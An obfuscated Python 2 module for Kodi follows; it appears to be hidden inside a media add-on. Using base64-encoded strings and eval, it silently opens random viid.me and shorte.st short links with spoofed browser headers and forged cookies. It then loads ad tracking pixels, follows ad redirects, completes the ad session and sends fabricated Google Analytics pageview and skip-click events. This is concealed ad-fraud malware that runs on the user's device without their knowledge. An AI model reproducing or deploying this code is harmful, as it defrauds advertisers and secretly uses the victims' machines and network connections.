import re
NB=object
Nj=True
No=eval
NM=str
NO=max
NK=int
NT=None
Nf=False
Nm=len
E=re.DOTALL
q=re.compile
import random
G=random.randint
import urllib
g=urllib.urlencode
import urllib2
Ny=urllib2.Request
Nu=urllib2.HTTPError
Nk=urllib2.build_opener
Na=urllib2.HTTPCookieProcessor
import copy
ND=copy.copy
import traceback
NU=traceback.print_exc
import time
Nd=time.time
Nc=time.sleep
import xbmc
NA=xbmc.getInfoLabel
import base64
NC=base64.b64decode
from cookielib import Cookie,CookieJar
from random import getrandbits
class H(NB):
    def __init__(N):
        N.debug=Nf
        N.HEADER_CFG=No(NC('eydBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjgnLCAnQWNjZXB0LUVuY29kaW5nJzogJ25vbmUnLCAnQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOCcsICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTQuMC4yODQwLjk5IFNhZmFyaS81MzcuMzYnLCAnQWNjZXB0LUNoYXJzZXQnOiAnSVNPLTg4NTktMSx1dGYtODtxPTAuNywqO3E9MC4zJywgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZSd9'))
        N.cookiejar=CookieJar()
        N.urlOpener=Nk(Na(N.cookiejar))
        N.timeStamp=N.s()
        N.value1=NM(G(75000000,85000000))
        N.valuea=NM(G(600000000,700000000))
        N.p(NC('LnNob3J0ZS5zdA=='))
        N.p(NC('dmlpZC5tZQ=='))
        a=NA('System.ScreenResolution')
        y=q('(.*)(x)(.*)(@)(.*)')
        u =y.match(a)
        N.resolution=u.group(1)+'x'+u.group(3)
        N.vp= u.group(1)+'x'+NM(NO(250,(NK(u.group(3))-500)))
        N.uid=NM(G(100000,999999))
    def s(N):
        return NM(NK(Nd()))
    def p(N,host):
        D=NC('R0ExLjIu')+N.value1+"."+N.s()
        c=Cookie(NT,NC('X2dh'),D,NT,NT,host,NT,NT,'/',NT,Nf,Nf,NT,NT,NT,NT)
        N.cookiejar.set_cookie(c)
    def t(N,d):
        U=q(NC('KGh0dHB8aHR0cHMpKDovLykod3d3XC58LipcLnwpKC4qPykoXC4pKC4qPykoLykoLiop'))
        u=U.match(d)
        if u is not NT:
            return u.group(4)+'.'+u.group(6)
        else:
            return NT
    def X(N,d):
        N.host=N.t(d)
        if d.endswith('/'):
            N.url=d[:-1]
        else:
            N.url=d
        N.p(N.host)
        c=Ny(N.url,headers=N.HEADER_CFG)
        A=NT
        try:
            A=N.urlOpener.open(c)
            if A is not NT and A.getcode()==200:
                C=A.read()
                B=q(NC('KC4qKShzZXNzaW9uSWQ6ICIpKC57MSw1MH0pKCIsKSguKik='),E)
                u=B.match(C)
                if u is not NT:
                    N.adSessionId=u.group(3)
                    N.h(C)
                    N.P(C)
                    N.R()
                    j=6
                    while j>0:
                        j=j-1
                        Nc(1)
                    o=ND(N.HEADER_CFG)
                    o[NC('SG9zdA==')] =N.host
                    o[NC('UmVmZXJlcg==')]=N.url
                    M =NC('aHR0cDovLw==')+N.host+NC('L3Nob3J0ZXN0LXVybC9lbmQtYWRzZXNzaW9uPw==')
                    ts=N.s()
                    O ={NC('YWRTZXNzaW9uSWQ='):N.adSessionId,NC('Y2FsbGJhY2s='):NC('cmVxd2VzdF8=')+ts,NC('YWRiZA=='):'0'}
                    K=g(O)
                    M+=K
                    c=Ny(M,headers=o)
                    A=NT
                    try:
                        A=N.urlOpener.open(c)
                    except:
                        if N.debug:
                            NU()
                    if A is not NT and A.getcode()==200:
                        N.S()
                        A.read()
                        N.F()
        except:
            if N.debug:
                NU()
        return d
    def h(N,C):
        o=ND(N.HEADER_CFG)
        o[NC('SG9zdA==')] =N.host
        o[NC('UmVmZXJlcg==')]=N.url
        T=q(NC('KC4qKSgiXC9idW5kbGVzXC9hZHZlcnRpc2VtZW50XC9pbWdcL3RyYWNraW5nXC5naWZcPykoLio/KSgiKSguKik='),E)
        u=T.match(C)
        if u is not NT:
            N.b(NC('aHR0cDovLw==')+N.host+NC('L2J1bmRsZXMvYWR2ZXJ0aXNlbWVudC9pbWcvdHJhY2tpbmcuZ2lmPw==')+u.group(3))
            c=Ny(NC('aHR0cDovLw==')+N.host+NC('L2J1bmRsZXMvYWR2ZXJ0aXNlbWVudC9pbWcvdHJhY2tpbmcuZ2lmPw==')+u.group(3),headers=o)
            A=NT
            try:
                A=N.urlOpener.open(c)
                N.b(A.getcode())
            except:
                if N.debug:
                    NU()
        f=q(NC('KC4qKSgiXC9idW5kbGVzXC9zbWV3ZWJcL2ltZ1wvYWR2ZXJ0aXNlbWVudC10cmFja2luZy0pKC4qPykoIikoLiop'),E)
        u=f.match(C)
        if u is not NT:
            N.b(NC('aHR0cDovLw==')+N.host+NC('L2J1bmRsZXMvc21ld2ViL2ltZy9hZHZlcnRpc2VtZW50LXRyYWNraW5nLQ==')+u.group(3))
            c=Ny(NC('aHR0cDovLw==')+N.host+NC('L2J1bmRsZXMvc21ld2ViL2ltZy9hZHZlcnRpc2VtZW50LXRyYWNraW5nLQ==')+u.group(3),headers=o)
            A=NT
            try:
                A=N.urlOpener.open(c)
                N.b(A.getcode())
            except:
                if N.debug:
                    NU()
        m=q(NC('KC4qKSgiXC9idW5kbGVzXC9zbWV3ZWJcL2ltZ1wvdHJhY2tpbmctKSguKj8pKCIpKC4qKQ=='),E)
        u=m.match(C)
        if u is not NT:
            N.b(NC('aHR0cDovLw==')+N.host+NC('L2J1bmRsZXMvc21ld2ViL2ltZy90cmFja2luZy0=')+u.group(3))
            c=Ny(NC('aHR0cDovLw==')+N.host+NC('L2J1bmRsZXMvc21ld2ViL2ltZy90cmFja2luZy0=')+u.group(3),headers=o)
            A=NT
            try:
                A=N.urlOpener.open(c)
                N.b(A.getcode())
            except:
                if N.debug:
                    NU()
        z=q(NC('KC4qKSgiaHR0cDpcL1wvYWRzXC5zaG9ydGVcLnN0XC9wb3BcLnBocFw/KSguKj8pKCJ8JnF1b3Q7KSguKik='),E)
        u=z.match(C)
        if u is not NT:
            o[NC('SG9zdA==')]=NC('YWRzLnNob3J0ZS5zdA==')
            N.b(NC('aHR0cDovL2Fkcy5zaG9ydGUuc3QvcG9wLnBocD8=')+u.group(3))
            c=Ny(NC('aHR0cDovL2Fkcy5zaG9ydGUuc3QvcG9wLnBocD8=')+u.group(3),headers=o)
            A=NT
            try:
                A=N.urlOpener.open(c)
                N.b(A.getcode())
            except:
                if N.debug:
                    NU()
    def P(N,C):
        o=ND(N.HEADER_CFG)
        o[NC('SG9zdA==')] =NC('YWRzLnNob3J0ZS5zdA==')
        o[NC('UmVmZXJlcg==')]=N.url
        V=q(NC('KC4qKShhZHNcLnBocFw/a2V5PSkoLio/KSgifCZxdW90OykoLiop'),E)
        u=V.match(C)
        if u is not NT:
            J=NC('aHR0cDovL2Fkcy5zaG9ydGUuc3QvYWRzLnBocD9rZXk9')+u.group(3).replace('&amp;','&')
            N.e(J)
    def e(N,J):
        o=ND(N.HEADER_CFG)
        o[NC('UmVmZXJlcg==')]=N.url
        if NC('YWRzLnNob3J0ZS5zdA==')in J:
            o[NC('SG9zdA==')]=NC('YWRzLnNob3J0ZS5zdA==')
        N.b(J)
        c=Ny(J,headers=o)
        A=NT
        I=NT
        try:
            A=N.urlOpener.open(c)
            C=A.read()
            N.b(A.getcode())
            N.b(C)
            i=q(NC('KC4qKShsaW5rIHJlbD0iZG5zLXByZWZldGNoIiBocmVmPSIpKC4qPykoInwmcXVvdDspKC4qKQ=='),E)
            u=i.match(C)
            if u is not NT:
                I=u.group(3)
            else:
                i=q(NC('KC4qKShkb2N1bWVudFwubG9jYXRpb25cLnJlcGxhY2VcKCcpKC4qPykoJykoLiop'),E)
                u=i.match(C)
                if u is not NT:
                    I=u.group(3)
            if I is not NT:
                N.e(I)
        except Nu as httpe:
            A=httpe
            if A.getcode()==302 and 'location' in A.info():
                I=A.info()['location']
                if I.startswith('//'):
                    I='http:'+I
                N.e(I)
            else:
                N.b(A.getcode())
                N.b(A.info())
                N.b(A.read())
        except:
            if N.debug:
                NU()
    def R(N):
        r={'v':'1','_v':'j47','a':N.valuea,'t':'pageview','_s':'1','dl':N.url,'ul':'fr','de':'UTF-8','dt':NC('RWFybiBtb25leSBvbiBzaG9ydCBsaW5rcy4gTWFrZSBzaG9ydCBsaW5rcyBhbmQgZWFybiB0aGUgYmlnZ2VzdCBtb25leSAtIHNob3J0ZS5zdA=='),'sd':'24-bit','sr':N.resolution,'vp':N.vp,'je':'1','fl':'24.0 r0','_u':'SEAAAAABI~','jid':N.value1,'cid':N.value1+'.'+NM(NK(N.timeStamp)-1)+'','uid':N.uid,'tid':NC('VUEtNDIyOTY3NDktMQ=='),'_r':'1','cd2':'2017-02-17.0','cd7':'447206','cd5':'0','z':'260111890'}
        N.W(r)
    def S(N):
        r={'v':'1','_v':'j47','a':N.valuea,'t':'event','_s':'2','dl':N.url,'ul':'fr','de':'UTF-8','dt':NC('RWFybiBtb25leSBvbiBzaG9ydCBsaW5rcy4gTWFrZSBzaG9ydCBsaW5rcyBhbmQgZWFybiB0aGUgYmlnZ2VzdCBtb25leSAtIHNob3J0ZS5zdA=='),'sd':'24-bit','sr':N.resolution,'vp':N.vp,'je':'1','fl':'24.0 r0','ec':NC('aW50ZXJzdGl0aWFs'),'ea':'callback','el':'success','_utma':'1.'+N.value1+'.'+NM(NK(N.timeStamp)-1)+'.'+N.timeStamp+'.'+N.timeStamp+'.1','_utmz':'1.'+N.timeStamp+'.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)','_utmht':N.timeStamp,'_u':'SEACAAABI~','jid':'','cid':N.value1+'.'+NM(NK(N.timeStamp)-1)+'','uid':N.uid,'tid':NC('VUEtNDIyOTY3NDktMQ=='),'cd2':'2017-02-17.0','cd7':'447206','cd5':'0','z':'1705799455'}
        N.W(r)
    def F(N):
        r={'v':'1','_v':'j47','a':'236436529','t':'event','_s':'3','dl':N.url,'ul':'fr','de':'UTF-8','dt':NC('RWFybiBtb25leSBvbiBzaG9ydCBsaW5rcy4gTWFrZSBzaG9ydCBsaW5rcyBhbmQgZWFybiB0aGUgYmlnZ2VzdCBtb25leSAtIHNob3J0ZS5zdA=='),'sd':'24-bit','sr':N.resolution,'vp':N.vp,'je':'0','fl':'24.0%20r0','ec':NC('aW50ZXJzdGl0aWFs'),'ea':'click','el':'skip','_utma':'1.'+N.value1+'.'+NM(NK(N.timeStamp)-1)+'.'+N.timeStamp+'.'+N.timeStamp+'.1','_utmz':'1.'+N.timeStamp+'.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)','_utmht':''+N.timeStamp,'_u':'SEACAAABI~','jid':N.timeStamp,'cid':N.value1+'.'+NM(NK(N.timeStamp)-1)+'','uid':N.uid,'tid':NC('VUEtNDIyOTY3NDktMQ=='),'_r':'1','cd2':'2017-02-17.0','cd7':'2695216','cd5':'0','z':'872032684'}
        N.W(r)
    def W(N,r):
        v=NC('aHR0cHM6Ly93d3cuZ29vZ2xlLWFuYWx5dGljcy5jb20vci9jb2xsZWN0Pw==')+g(r)
        o=ND(N.HEADER_CFG)
        o[NC('UmVmZXJlcg==')]=N.url
        c=Ny(v,headers=o)
        try:
            N.urlOpener.open(c)
        except:
            if N.debug:
                NU()
    def b(N,obj):
        if N.debug:
            print NM(obj)
class Q():
    def __init__(N):
        N.debug=Nf
        N.URL=''
        N.SPLITTING='\n'
        N.RANDOMSH=['aHR0cDovL3ZpaWQubWUvcXY0Rk1J','aHR0cDovL3ZpaWQubWUvcXY0RjFR','aHR0cDovL3ZpaWQubWUvcXY0RjFY','aHR0cDovL3ZpaWQubWUvcXY0RjIw','aHR0cDovL3ZpaWQubWUvcXY0RjJw','aHR0cDovL3ZpaWQubWUvcXY0RjJu','aHR0cDovL3ZpaWQubWUvcXY0RjNl','aHR0cDovL3ZpaWQubWUvcXY0RjNr','aHR0cDovL3ZpaWQubWUvcXY0RjRx','aHR0cDovL3ZpaWQubWUvcXY0RjVv','aHR0cDovL3ZpaWQubWUvcXY0RjVv','aHR0cDovL3ZpaWQubWUvcXY0RjdG','aHR0cDovL3ZpaWQubWUvcXY0Rjc4','aHR0cDovL3ZpaWQubWUvcXY0Rjh2','aHR0cDovL3ZpaWQubWUvcXY0RjhK','aHR0cDovL3ZpaWQubWUvcXY0Rjgx','aHR0cDovL3ZpaWQubWUvcXY0Rjl5','aHR0cDovL3ZpaWQubWUvcXY0RjlQ','aHR0cDovL3ZpaWQubWUvcXY0RjlO','aHR0cDovL3ZpaWQubWUvcXY0RzBv','aHR0cDovL3ZpaWQubWUvcXY0R3F1','aHR0cDovL3ZpaWQubWUvcXY0R3Fq','aHR0cDovL3ZpaWQubWUvcXY0R3FR','aHR0cDovL3ZpaWQubWUvcXY0R3FI','aHR0cDovL3ZpaWQubWUvcXY0R3E1','aHR0cDovL3ZpaWQubWUvcXY0R3dn','aHR0cDovL3ZpaWQubWUvcXY0R3dP','aHR0cDovL3ZpaWQubWUvcXY0R3dM','aHR0cDovL3ZpaWQubWUvcXY0R3c4','aHR0cDovL3ZpaWQubWUvcXY0R2Vk','aHR0cDovL3ZpaWQubWUvcXY0R3J5','aHR0cDovL3ZpaWQubWUvcXY0R3Jo','aHR0cDovL3ZpaWQubWUvcXY0R3Jt','aHR0cDovL3ZpaWQubWUvcXY0R3JQ','aHR0cDovL3ZpaWQubWUvcXY0R3I0','aHR0cDovL3ZpaWQubWUvcXY0R3Rv','aHR0cDovL3ZpaWQubWUvcXY0R3RJ','aHR0cDovL3ZpaWQubWUvcXY0R3RW','aHR0cDovL3ZpaWQubWUvcXY0R3Qy','aHR0cDovL3ZpaWQubWUvcXY0R3l1','aHR0cDovL3ZpaWQubWUvcXY0R3V6','aHR0cDovL3ZpaWQubWUvcXY0R3l1','aHR0cDovL3ZpaWQubWUvcXY0R2lD','aHR0cDovL3ZpaWQubWUvcXY0R29x','aHR0cDovL3ZpaWQubWUvcXY0R29t','aHR0cDovL3ZpaWQubWUvcXY0R3BJ','aHR0cDovL3ZpaWQubWUvcXY0R2Fq','aHR0cDovL3ZpaWQubWUvcXY0R2FI','aHR0cDovL3ZpaWQubWUvcXY0R3NS','aHR0cDovL3ZpaWQubWUvcXY0R2Rl','aHR0cDovL3ZpaWQubWUvcXY0R2RT','aHR0cDovL3ZpaWQubWUvcXY0R2RD','aHR0cDovL3ZpaWQubWUvcXY0R2Zx','aHR0cDovL3ZpaWQubWUvcXY0R2Zo','aHR0cDovL3ZpaWQubWUvcXY0R2ZU','aHR0cDovL3ZpaWQubWUvcXY0R2Y0','aHR0cDovL3ZpaWQubWUvcXY0R2c3','aHR0cDovL3ZpaWQubWUvcXY0R2hj','aHR0cDovL3ZpaWQubWUvcXY0R2hI','aHR0cDovL3ZpaWQubWUvcXY0R2ow','aHR0cDovL3ZpaWQubWUvcXY0R2oz','aHR0cDovL3ZpaWQubWUvcXY0R2t2','aHR0cDovL3ZpaWQubWUvcXY0R2tV','aHR0cDovL3ZpaWQubWUvcXY0R2tK','aHR0cDovL3ZpaWQubWUvcXY0R2sx','aHR0cDovL3ZpaWQubWUvcXY0R2xt','aHR0cDovL3ZpaWQubWUvcXY0R2xa','aHR0cDovL3ZpaWQubWUvcXY0R2w5','aHR0cDovL3ZpaWQubWUvcXY0R3pi','aHR0cDovL3ZpaWQubWUvcXY0R3oy','aHR0cDovL3ZpaWQubWUvcXY0R2w5','aHR0cDovL3ZpaWQubWUvcXY0R2NG','aHR0cDovL3ZpaWQubWUvcXY0R3Zp','aHR0cDovL3ZpaWQubWUvcXY0R3Z2','aHR0cDovL3ZpaWQubWUvcXY0R3ZD','aHR0cDovL3ZpaWQubWUvcXY0R2J5','aHR0cDovL3ZpaWQubWUvcXY0R2JQ','aHR0cDovL3ZpaWQubWUvcXY0R2I5','aHR0cDovL3ZpaWQubWUvcXY0R25s','aHR0cDovL3ZpaWQubWUvcXY0R25J','aHR0cDovL3ZpaWQubWUvcXY0R0U0','aHR0cDovL3ZpaWQubWUvcXY0R1JF','aHR0cDovL3ZpaWQubWUvcXY0R1RB','aHR0cDovL3ZpaWQubWUvcXY0R1ln','aHR0cDovL3ZpaWQubWUvcXY0R1VK','aHR0cDovL3ZpaWQubWUvcXY0R0l4','aHR0cDovL3ZpaWQubWUvcXY0R0lU','aHR0cDovL3ZpaWQubWUvcXY0R0k5','aHR0cDovL3ZpaWQubWUvcXY0R09i','aHR0cDovL3ZpaWQubWUvcXY0R1B3','aHR0cDovL3ZpaWQubWUvcXY0R0tx','aHR0cDovL3ZpaWQubWUvcXY0R0tH','aHR0cDovL3ZpaWQubWUvcXY0R1hG','aHR0cDovL3ZpaWQubWUvcXY0RzFk','aHR0cDovL3ZpaWQubWUvcXY0RzUz','aHR0cDovL3ZpaWQubWUvcXY0Rzg3','aHR0cDovL3ZpaWQubWUvcXY0SHFp','aHR0cDovL3ZpaWQubWUvcXY0SGVv','aHR0cDovL3ZpaWQubWUvcXY0SHJB','aHR0cDovL3ZpaWQubWUvcXY0SHRS']
        N.links=[]
        for n in N.RANDOMSH:
            N.links.append(NC(n))
    def L(N):
        l=G(0,Nm(N.links))
        return N.links[l]
    def w(N,x):
        return G(0,x)
    def b(N,obj):
        if N.debug:
            print NM(obj)
    def x(N):
        Y=H()
        d=N.L()
        Y.X(d)


def r():
    shl = sh.Q()
    shl.x()
